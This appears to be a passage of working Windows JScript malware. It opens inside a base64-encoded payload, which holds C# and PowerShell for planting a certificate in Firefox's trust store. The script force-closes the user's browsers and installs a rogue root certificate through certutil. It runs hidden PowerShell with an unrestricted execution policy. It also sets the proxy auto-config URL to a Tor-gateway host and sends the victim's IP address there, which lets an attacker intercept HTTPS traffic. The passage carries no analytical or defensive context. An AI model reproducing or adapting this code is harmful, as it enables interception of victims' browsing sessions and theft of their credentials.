NCiAgICBbVW5tYW5hZ2VkRnVuY3Rpb25Qb2ludGVyKENhbGxpbmdDb252ZW50aW9uLkNkZWNsKV0NCiAgICBwdWJsaWMgZGVsZWdhdGUgaW50IENFUlRfRGVzdHJveUNlcnRBcnJheVB0cihJbnRQdHIgY2VydCwgdWludCBuY2VydHMpOw0KICAgIHByaXZhdGUgaW50IENFUlRfRGVzdHJveUNlcnRBcnJheShJbnRQdHIgY2VydCwgdWludCBuY2VydHMpDQogICAgew0KICAgICAgICBJbnRQdHIgcFByb2MgPSBHZXRQcm9jQWRkcmVzcyhuc3NNb2R1bGUsICJDRVJUX0Rlc3Ryb3lDZXJ0QXJyYXkiKTsNCiAgICAgICAgQ0VSVF9EZXN0cm95Q2VydEFycmF5UHRyIHB0ciA9IChDRVJUX0Rlc3Ryb3lDZXJ0QXJyYXlQdHIpTWFyc2hhbC5HZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcihwUHJvYywgdHlwZW9mKENFUlRfRGVzdHJveUNlcnRBcnJheVB0cikpOw0KICAgICAgICByZXR1cm4gcHRyKGNlcnQsIG5jZXJ0cyk7DQogICAgfQ0KDQoJcHJpdmF0ZSBJbnRQdHIgbnNzTW9kdWxlID0gSW50UHRyLlplcm87DQoJDQoJcHVibGljIEJvb2xlYW4gU3RhcnQoU3RyaW5nIHNDZXJ0KXsNCgkJU3RyaW5nIHNQcm9maWxlID0gR2V0UHJvZmlsZSgpOw0KICAgICAgICBpZiAoU3RyaW5nLklzTnVsbE9yRW1wdHkoc1Byb2ZpbGUpKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgYnl0ZVtdIGJDZXJ0ID0gR2V0Q2VydEFzQnl0ZUFycmF5KHNDZXJ0KTsNCgkJSW50UHRyIGlwQ2VydCA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGJDZXJ0Lkxlbmd0aCk7DQoJCXRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBEaXJlY3RvcnlJbmZvIGRpSW5zdGFsbFBhdGggPSBHZXRJbnN0YWxsUGF0aCgpOw0KICAgICAgICAgICAgU3RyaW5nIHNDdXJyZW50RGlyZWN0b3J5ID0gRGlyZWN0b3J5LkdldEN1cnJlbnREaXJlY3RvcnkoKTsNCiAgICAgICAgICAgIERpcmVjdG9yeS5TZXRDdXJyZW50RGlyZWN0b3J5KGRpSW5zdGFsbFBhdGguRnVsbE5hbWUpOw0KICAgICAgICAgICAgbnNzTW9kdWxlID0gTG9hZFdpbjMyTGlicmFyeShkaUluc3RhbGxQYXRoLkZ1bGxOYW1lICsgIlxcbnNzMy5kbGwiKTsNCiAgICAgICAgICAgIGlmIChuc3NNb2R1bGUuRXF1YWxzKEludFB0ci5aZXJvKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBEaXJlY3RvcnkuU2V0Q3VycmVudERpcmVjdG9yeShzQ3VycmVudERpcmVjdG9yeSk7DQogICAgICAgICAgICAvL0luaXQgY2VydA0KICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJDZXJ0LCAwLCBpcENlcnQsIGJDZXJ0Lkxlbmd0aCk7DQogICAgICAgICAgICBTRUNJdGVtIENlcnRJdGVtID0gbmV3IFNFQ0l0ZW0oKTsNCiAgICAgICAgICAgIENlcnRJdGVtLmlUeXBlID0gMzsgICAgIC8vICAgKi5kZXINCiAgICAgICAgICAgIENlcnRJdGVtLmJEYXRhID0gaXBDZXJ0Ow0KICAgICAgICAgICAgQ2VydEl0ZW0uaURhdGFMZW4gPSAodWludCliQ2VydC5MZW5ndGg7DQogICAgICAgICAgICBTRUNJdGVtW10gYUNlcnRJdGVtID0gbmV3IFNFQ0l0ZW1bMV07DQogICAgICAgICAgICBhQ2VydEl0ZW1bMF0gPSBDZXJ0SXRlbTsNCg0KICAgICAgICAgICAgQ2VydFRydXN0cyBDZXJ0VHJ1c3QgPSBuZXcgQ2VydFRydXN0cygpOw0KICAgICAgICAgICAgQ2VydFRydXN0LmlTaXRlID0gMHgxMDsNCiAgICAgICAgICAgIENlcnRUcnVzdC5pRW1haWwgPSAweDEwOw0KICAgICAgICAgICAgQ2VydFRydXN0LmlTb2Z0ID0gMHgxMDsNCg0KICAgICAgICAgICAgSW50UHRyIENlcnRUb0ltcG9ydCA9IG5ldyBJbnRQdHIoKTsNCiAgICAgICAgICAgIEludFB0cltdIGFDZXJ0VG9JbXBvcnQgPSBuZXcgSW50UHRyWzFdOw0KICAgICAgICAgICAgLy9FbmQgaW5pdCBjZXJ0DQogICAgICAgICAgICBpbnQgc3RhdHVzID0gTlNTX0luaXRpYWxpemUoc1Byb2ZpbGUsICIiLCAiIiwgU0VDTU9EX0RCLCBOU1NfSU5JVF9PUFRJTUlaRVNQQUNFKTsNCiAgICAgICAgICAgIGlmIChzdGF0dXMgIT0gRVJST1JfU1VDQ0VTUykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBJbnRQdHIgYmQgPSBDRVJUX0dldERlZmF1bHRDZXJ0REIoKTsNCiAgICAgICAgICAgIGlmIChiZC5FcXVhbHMoSW50UHRyLlplcm8pKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIE5TU19TaHV0ZG93bigpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHN0YXR1cyA9IENFUlRfSW1wb3J0Q2VydHMoYmQsIDExLCAxLCByZWYgYUNlcnRJdGVtLCByZWYgQ2VydFRvSW1wb3J0LCAxLCAwLCBJbnRQdHIuWmVybyk7DQogICAgICAgICAgICBpZiAoc3RhdHVzICE9IEVSUk9SX1NVQ0NFU1MpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTlNTX1NodXRkb3duKCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgTWFyc2hhbC5Db3B5KENlcnRUb0ltcG9ydCwgYUNlcnRUb0ltcG9ydCwgMCwgMSk7DQogICAgICAgICAgICBzdGF0dXMgPSBDRVJUX0NoYW5nZUNlcnRUcnVzdChiZCwgYUNlcnRUb0ltcG9ydFswXSwgcmVmIENlcnRUcnVzdCk7DQogICAgICAgICAgICBpZiAoIHN0YXR1cyAhPSBFUlJPUl9TVUNDRVNTKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBOU1NfU2h1dGRvd24oKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9Ow0KICAgICAgICAgICAgQ0VSVF9EZXN0cm95Q2VydEFycmF5KENlcnRUb0ltcG9ydCwgMSk7DQogICAgICAgICAgICBOU1NfU2h1dGRvd24oKTsNCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChFeGNlcHRpb24pe30NCiAgICAgICAgZmluYWxseQ0KICAgICAgICB7DQogICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGlwQ2VydCk7DQogICAgICAgICAgICBpcENlcnQgPSBJbnRQdHIuWmVybzsNCiAgICAgICAgICAgIE5TU19TaHV0ZG93bigpOw0KICAgICAgICB9DQoJCXJldHVybiB0cnVlOw0KCX0NCglwcml2YXRlIFN0cmluZyBHZXRQcm9maWxlKCkNCiAgICB7DQogICAgICAgIFN0cmluZyBGRlByb2ZpbGUgPSBQYXRoLkNvbWJpbmUoRW52aXJvbm1lbnQuR2V0RW52aXJvbm1lbnRWYXJpYWJsZSgiQVBQREFUQSIpLCBAIk1vemlsbGFcRmlyZWZveFxQcm9maWxlcyIpOw0KICAgICAgICBpZiAoRGlyZWN0b3J5LkV4aXN0cyhGRlByb2ZpbGUpKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRGlyZWN0b3J5LkdldERpcmVjdG9yaWVzKEZGUHJvZmlsZSwgIiouZGVmYXVsdCIpLkxlbmd0aCA+IDApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIERpcmVjdG9yeS5HZXREaXJlY3RvcmllcyhGRlByb2ZpbGUsICIqLmRlZmF1bHQiKVswXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIiI7DQogICAgfQ0KCXB1YmxpYyBieXRlW10gR2V0Q2VydEFzQnl0ZUFycmF5KFN0cmluZyBzQ2VydCkNCiAgICB7DQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICByZXR1cm4gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHNDZXJ0KTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKXt9DQogICAgICAgIHJldHVybiBudWxsOw0KICAgIH0NCglwcml2YXRlIERpcmVjdG9yeUluZm8gR2V0SW5zdGFsbFBhdGgoKQ0KICAgIHsNCiAgICAgICAgRGlyZWN0b3J5SW5mbyBmaXJlZm94UGF0aCA9IG51bGw7DQogICAgICAgIC8vIGdldCBmaXJlZm94IHBhdGggZnJvbSByZWdpc3RyeQ0KICAgICAgICAvLyB3ZSdsbCBzZWFyY2ggdGhlIDMyYml0IGluc3RhbGwgbG9jYXRpb24NCiAgICAgICAgUmVnaXN0cnlLZXkgbG9jYWxNYWNoaW5lMSA9IFJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KEAiU09GVFdBUkVcTW96aWxsYVxNb3ppbGxhIEZpcmVmb3giLCBmYWxzZSk7DQogICAgICAgIC8vIGFuZCBsZXRzIHRyeSB0aGUgNjRiaXQgaW5zdGFsbCBsb2NhdGlvbiBqdXN0IGluIGNhc2UNCiAgICAgICAgUmVnaXN0cnlLZXkgbG9jYWxNYWNoaW5lMiA9IFJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KEAiU09GVFdBUkVcV293NjQzMk5vZGVcTW96aWxsYVxNb3ppbGxhIEZpcmVmb3giLCBmYWxzZSk7DQoNCiAgICAgICAgaWYgKGxvY2FsTWFjaGluZTEgIT0gbnVsbCkNCiAgICAgICAgew0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nW10gaW5zdGFsbGVkVmVyc2lvbnMgPSBsb2NhbE1hY2hpbmUxLkdldFN1YktleU5hbWVzKCk7DQogICAgICAgICAgICAgICAgLy8gd2UnbGwgdGFrZSB0aGUgZmlyc3QgaW5zdGFsbGVkIHZlcnNpb24sIHBlb3BsZSBub3JtYWxseSBvbmx5IGhhdmUgb25lDQogICAgICAgICAgICAgICAgaWYgKGluc3RhbGxlZFZlcnNpb25zLkxlbmd0aCA9PSAwKQ0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgSW5kZXhPdXRPZlJhbmdlRXhjZXB0aW9uKCJObyBpbnN0YWxscyBvZiBmaXJlZm94IHJlY29yZGVkIGluIGl0cyBrZXkuIik7DQoNCiAgICAgICAgICAgICAgICBSZWdpc3RyeUtleSBtYWluSW5zdGFsbCA9IGxvY2FsTWFjaGluZTEuT3BlblN1YktleShpbnN0YWxsZWRWZXJzaW9uc1swXSk7DQoNCiAgICAgICAgICAgICAgICAvLyBnZXQgaW5zdGFsbCBkaXJlY3RvcnkNCiAgICAgICAgICAgICAgICBzdHJpbmcgaW5zdGFsbFN0cmluZyA9IChzdHJpbmcpbWFpbkluc3RhbGwuT3BlblN1YktleSgiTWFpbiIpLkdldFZhbHVlKCJJbnN0YWxsIERpcmVjdG9yeSIsIG51bGwpOw0KDQogICAgICAgICAgICAgICAgaWYgKGluc3RhbGxTdHJpbmcgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IE51bGxSZWZlcmVuY2VFeGNlcHRpb24oIkluc3RhbGwgc3RyaW5nIHdhcyBudWxsIik7DQoNCiAgICAgICAgICAgICAgICBmaXJlZm94UGF0aCA9IG5ldyBEaXJlY3RvcnlJbmZvKGluc3RhbGxTdHJpbmcpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChsb2NhbE1hY2hpbmUyICE9IG51bGwpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIGluc3RhbGxlZFZlcnNpb25zID0gbG9jYWxNYWNoaW5lMi5HZXRTdWJLZXlOYW1lcygpOw0KICAgICAgICAgICAgICAgIC8vIHdlJ2xsIHRha2UgdGhlIGZpcnN0IGluc3RhbGxlZCB2ZXJzaW9uLCBwZW9wbGUgbm9ybWFsbHkgb25seSBoYXZlIG9uZQ0KICAgICAgICAgICAgICAgIGlmIChpbnN0YWxsZWRWZXJzaW9ucy5MZW5ndGggPT0gMCkNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEluZGV4T3V0T2ZSYW5nZUV4Y2VwdGlvbigiTm8gaW5zdGFsbHMgb2YgZmlyZWZveCByZWNvcmRlZCBpbiBpdHMga2V5LiIpOw0KDQogICAgICAgICAgICAgICAgUmVnaXN0cnlLZXkgbWFpbkluc3RhbGwgPSBsb2NhbE1hY2hpbmUyLk9wZW5TdWJLZXkoaW5zdGFsbGVkVmVyc2lvbnNbMF0pOw0KDQogICAgICAgICAgICAgICAgLy8gZ2V0IGluc3RhbGwgZGlyZWN0b3J5DQogICAgICAgICAgICAgICAgc3RyaW5nIGluc3RhbGxTdHJpbmcgPSAoc3RyaW5nKW1haW5JbnN0YWxsLk9wZW5TdWJLZXkoIk1haW4iKS5HZXRWYWx1ZSgiSW5zdGFsbCBEaXJlY3RvcnkiLCBudWxsKTsNCg0KICAgICAgICAgICAgICAgIGlmIChpbnN0YWxsU3RyaW5nID09IG51bGwpDQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBOdWxsUmVmZXJlbmNlRXhjZXB0aW9uKCJJbnN0YWxsIHN0cmluZyB3YXMgbnVsbCIpOw0KICAgICAgICAgICAgICAgIGZpcmVmb3hQYXRoID0gbmV3IERpcmVjdG9yeUluZm8oaW5zdGFsbFN0cmluZyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmaXJlZm94UGF0aDsNCiAgICB9DQp9DQoiQDsNCltGRl06OkdldEluc3RhbmNlKCkuU3RhcnQoJENlcnRQYXRoKTsNCn0NCkFkZENlcnRGRg=='
};

// Enums and initial values
var adBinaryType = 1
var adFldRowID = 100
var adFldIsNullable = 20
var adFldUnknownUpdatable = 8
var adVarBinary = 204
var ie = null;
var ff = null;
var created_certificate = null;

// Useful functions
var libraries = {
    BinaryDataToFile: function (filename, data) {
		
        var adodb_stream = new ActiveXObject('ADODB.Stream');
        adodb_stream.Open();
        adodb_stream.Type = adBinaryType;
		
        var recordset = new ActiveXObject('ADODB.Recordset');
		// Max Field Size
        var maxSize = data.length * 2;
		// Append(Fieldname, Type, FieldSize,
        recordset.Fields.Append('data', adVarBinary, maxSize, adFldRowID + adFldIsNullable + adFldUnknownUpdatable);
        recordset.Open();
        recordset.AddNew();
        recordset.Fields('data').AppendChunk(data);
        recordset.Update();
        recordset.MoveFirst();
		
        var final_data = recordset('data').GetChunk(max_size);
        recordset.Close();
        adodb_stream.Write(final_data);
        adodb_stream.Position = 0;
		
		// Remove file if exist
        if (filesystem.FileExists(filename)) {
            filesystem.DeleteFile(filename);
        }
		
		// save 
        adodb_stream.SaveToFile(filename);
        adodb_stream.Close();
		
        var source_file = new ActiveXObject('ADODB.Stream');
        source_file.Type = adBinaryType;
        source_file.Open();
        source_file.LoadFromFile(filename);
        source_file.Position = 0;

        var destination_file = new ActiveXObject('ADODB.Stream');
        destination_file.Type = adBinaryType;
        destination_file.Charset = 'ISO-8859-1';
        destination_file.Open();
		
        source_file.CopyTo(destination_file);
        source_file.Close();
        destination_file.SaveToFile(filename, o);
        destination_file.Close();
    },
	// Base64 Decode
	// TODO
    B64Dec: function (s) {
        var z = libraries.B64Dec.dtbl;
        if (undefined === z) {
			// String Range
            var A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
            var z = libraries.B64Dec.dtbl = new Array(256);
            for (var i = 0; i < z.length; i++) {
                var c = String.fromCharCode(i);
                z[i] = A.indexOf(c);
                if (z[i] < 0)
                    z[i] = 0;
            }
        }
        var B = new Array();
        var C, D, E;
        var F, G, H, I;
        s = s.replace(/[^A-Za-z0-9\+\/\=]/g, '');
        var J = s.length;
        while (61 === s.charCodeAt(J - 1))
            J--;
        var i = 0;
        var K = 4;
        while (K <= J) {
            var L = K + 20480;
            if (L > J)
                L = J;
            for (; K <= L; K += 4) {
                F = z[s.charCodeAt(i++)];
                G = z[s.charCodeAt(i++)];
                H = z[s.charCodeAt(i++)];
                I = z[s.charCodeAt(i++)];
                B.push(String.fromCharCode(F << 2 | G >> 4, (G & 15) << 4 | H >> 2, (H & 3) << 6 | I));
            }
            B = [B.join('')];
        }
        switch (J % 4) {
        case 0:
            break;
        case 2:
            F = z[s.charCodeAt(i++)];
            G = z[s.charCodeAt(i++)];
            B.push(String.fromCharCode(F << 2 | G >> 4));
            break;
        case 3:
            F = z[s.charCodeAt(i++)];
            G = z[s.charCodeAt(i++)];
            H = z[s.charCodeAt(i++)];
            B.push(String.fromCharCode(F << 2 | G >> 4, (G & 15) << 4 | H >> 2));
            break;
        case 1:
        default:
            throw Error('B64Dec(): Unexpected remainder: ' + J % 4 + '(' + J + ', ' + i + ')');
        }
        return B.join('');
    },
	// Generate Random Number
    RandomNumber: function (from, to) {
        from = parseInt(from, 10);
        to = parseInt(to, 10);
        return Math.floor(Math.random() * (to - from + 1)) + from;
    },
	// Generate Random String
    GenStr: function (length, special_char) {
        var iteration = 0;
        var final_string = '';
        var randomNumber;
        if (special_char === undefined) {
            special_char = false;
        }
        while (iteration < length) {
            randomNumber = Math.floor(Math.random() * 100) % 94 + 33;
            if (!special_char) {
                if (randomNumber >= 33 && randomNumber <= 47) {
                    continue;
                }
                if (randomNumber >= 58 && randomNumber <= 64) {
                    continue;
                }
                if (randomNumber >= 91 && randomNumber <= 96) {
                    continue;
                }
                if (randomNumber >= 123 && randomNumber <= 126) {
                    continue;
                }
            }
            iteration++;
            final_string += String.fromCharCode(randomNumber);
        }
        return final_string;
    },
    trim: function (input_string) {
        return input_string.replace(/(^\s+)|(\s+$)/g, '');
    }
};

// TODO
if (!String.format) {
    String.format = function (z) {
        var A = Array.prototype.slice.call(arguments, 1);
        return z.replace(/{(\d+)}/g, function (B, C) {
            return function () {
                try {
                    return A[C].typeof ? A[C].typeof : typeof A[C];
                } catch (e) {
                    return typeof A[C];
                }
            }() != 'undefined' ? A[C] : B;
        });
    };
}

function create_certificate_file() {
    this.FileName = 'cert.der';
    this.Init = function () {
        this.FileName = temp_path + '\\' + this.FileName;
        var data = libraries.B64Dec(resources.cert);
        libraries.BinaryDataToFile(this.FileName, data);
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function internet_explorer() {
    this.FileName = 'ps.ps1';
    this.GetIp = function () {
        var http_request = new ActiveXObject('MSXML2.XMLHTTP');
        {
            var error;
            try {
                http_request.open('GET', "http://api.ipify.org/", false);
                http_request.send();
                if (http_request.status == 200) {
                    return libraries.trim(http_request.responseText);
                }
            } catch (_e) {
                error = _e;
                {
                }
            }
        }
        {
            var error;
            try {
                http_request.open('GET', "http://icanhazip.com/", false);
                http_request.send();
                if (http_request.status == 200) {
                    return libraries.trim(http_request.responseText);
                }
            } catch (_e) {
                error = _e;
                {
                    return '';
                }
            }
        }
    };
    this.InstallPac = function () {
        wscript.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoDetect", 0, 'REG_DWORD');
        var random_server_id = libraries.RandomNumber(0, resources.servers.length - 1);
		// Select Random id between 0 and 
        var random_zero_one = libraries.RandomNumber(0, resources.torEntryNodeTld.length - 1);
        for (var i = 0; i < 5; i++) {
            var clientIP = this.GetIp();
			// Check internet connection 
            if (clientIP.length > 0) {

                this.WriteReg(
					String.format('{0}://{1}.{2}/{3}.js?ip={4}', 
					resources.protocols[random_zero_one], // https
					resources.servers[random_server_id], // j65je6flfiejsea2.onion
					resources.torEntryNodeTlds[random_zero_one], // to
					libraries.GenStr(8), // asd23s42
					clientIP) // 1.1.1.1
				);
				
				// Sample URL : https://j65je6flfiejsea2.onion.to/asd23s42.js?ip=1.1.1.1
            }
        }
    };
    this.WriteReg = function (value) {
        wscript.RegWrite('HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL', value, 'REG_SZ');
    };
    this.ConfirmCert = function () {
        this.FileName = temp_path + '\\' + this.FileName;
        var data = libraries.B64Dec(resources.powershell_ie);
        libraries.BinaryDataToFile(this.FileName, data);

        wscript.Run('powershell -ExecutionPolicy Unrestricted -File "' + this.FileName + '"', 0, false);
    };
    this.InstallCert = function () {
        if (!this.IsCertUtilInstalled()) {
			// :|
        }
        this.ConfirmCert();
        wscript.Run('certutil -addstore -f -user "ROOT" "' + created_certificate.FileName + '"', 0, true);
    };
    this.IsCertUtilInstalled = function () {
        {
            var error;
            try {
                wscript.Exec('certutil1 -?');
                return true;
            } catch (_e) {
                error = _e;
                {
                    return false;
                }
            }
        }
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function firefox() {
	
    var firefoxProfilesPath = appdata_path + '\Mozilla\Firefox\Profiles';
    this.FileName = 'psf.ps1';
	
    this.GetProfile = function () {
        if (filesystem.FolderExists(firefoxProfilesPath)) {
			
            var profilesDir = filesystem.GetFolder(firefoxProfilesPath).SubFolders;
			
			// Iterate all profiles to find default profile
            if (profilesDir.Count > 0) {
                var e = new Enumerator(profilesDir);
                e.moveFirst();
                while (e.atEnd() == false) {
                    var B = e.item();
                    if (B.Name.indexOf('.default') > -1) {
                        return B.Path;
                    }
                    e.moveNext();
                }
            }
        }
        return false;
    };
	
    this.InstallPac = function () {
		// Get Default profile
        var firefoxDefaultProfilePath = this.GetProfile();
		
        if (firefoxDefaultProfilePath != false) {
			
            var profilePrefsPath = firefoxDefaultProfilePath + '\\prefs.js';
            if (filesystem.FileExists(profilePrefsPath)) {
                var profilePrefsData = filesystem.OpenTextFile(profilePrefsPath, 1).ReadAll();
				
				// Read exist preferences and remove network proxy from it
                var profilePrefsDataLinesArray = profilePrefsData.split('\n');
                var newProfilePrefsDataArray = [];
                for (var i = 0; i < profilePrefsDataLinesArray.length; i++) {
                    if (profilePrefsDataLinesArray[i].indexOf('network.proxy.') == -1) {
                        newProfilePrefsDataArray.push(profilePrefsDataLinesArray[i]);
                    }
                }
				
				// Write new data to preferences file
                newProfilePrefsData = newProfilePrefsDataArray.join('\n');
                var prefsFile = filesystem.CreateTextFile(profilePrefsPath, true);
                prefsFile.Write(newProfilePrefsData);
                prefsFile.Close();
            }
        }
    };
    this.InstallCert = function () {
		// psf.ps1
        this.FileName = temp_path + '\\' + this.FileName;
        var decoded_psf = libraries.B64Dec(resources.powershell_firefox);
        file_data = decoded_psf.replace('%CERT%', resources.cert);
        libraries.BinaryDataToFile(this.FileName, file_data);
		
		// powershell -ExecutionPolicy Unrestricted -File "%TMP%\psf.ps1"
        wscript.Run('powershell -ExecutionPolicy Unrestricted -File "' + this.FileName + '"', 0, false);
    };
    this.Close = function () {
        if (filesystem.FileExists(this.FileName)) {
            filesystem.DeleteFile(this.FileName);
        }
    };
}

function main() {
    this.Init = function () {
        certificate = new create_certificate_file();
        certificate.Init();
        ie = new internet_explorer();
        ff = new firefox();
    };
    this.Start = function () {
        this.Init();
        this.CloseAllBrowsers();
        this.InstallIE();
        this.InstallFF();
        WScript.Sleep(5000);
        this.Close();
    };
    this.InstallIE = function () {
        ie.InstallCert();
        ie.InstallPac();
    };
    this.InstallFF = function () {
        ff.InstallCert();
        ff.InstallPac();
    };
    this.CloseAllBrowsers = function () {
        wscript.Run('taskkill /F /im iexplore.exe', 0, false);
        wscript.Run('taskkill /F /im firefox.exe', 0, false);
        wscript.Run('taskkill /F /im chrome.exe', 0, false);
    };
    this.Close = function () {
        certificate.Close();
        ie.Close();
        ff.Close();
    };
}
var main_object = new main();
main_object.Start();